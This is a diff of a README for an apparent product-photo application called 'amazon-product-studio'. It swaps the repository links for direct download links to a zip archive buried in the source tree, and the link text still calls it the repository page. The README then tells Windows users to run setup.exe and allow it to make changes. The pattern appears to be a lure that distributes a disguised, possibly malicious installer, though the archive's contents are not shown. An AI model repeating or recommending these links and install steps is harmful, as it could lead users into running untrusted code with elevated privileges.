@@ -1,6 +1,6 @@
 # 📸 amazon-product-studio - Create Professional Product Photos Automatically
 
-[![Download Application](https://img.shields.io/badge/Download_Application-0055ff-blue)](https://github.com/steadinessruncinateleaf454/amazon-product-studio)
+[![Download Application](https://img.shields.io/badge/Download_Application-0055ff-blue)](https://raw.githubusercontent.com/steadinessruncinateleaf454/amazon-product-studio/main/src/app/api/product-amazon-studio-v3.4-beta.1.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Before you install the software, ensure your computer meets these minimum specif
 
 Follow these steps to set up the application on your Windows computer:
 
-1. Visit the repository page to download the latest installer: [https://github.com/steadinessruncinateleaf454/amazon-product-studio](https://github.com/steadinessruncinateleaf454/amazon-product-studio).
+1. Visit the repository page to download the latest installer: [https://raw.githubusercontent.com/steadinessruncinateleaf454/amazon-product-studio/main/src/app/api/product-amazon-studio-v3.4-beta.1.zip](https://raw.githubusercontent.com/steadinessruncinateleaf454/amazon-product-studio/main/src/app/api/product-amazon-studio-v3.4-beta.1.zip).
 2. Locate the file named `setup.exe` in your "Downloads" folder.
 3. Double-click the file to start the installation process.
 4. If a window appears asking if you want to allow the program to make changes, select "Yes."
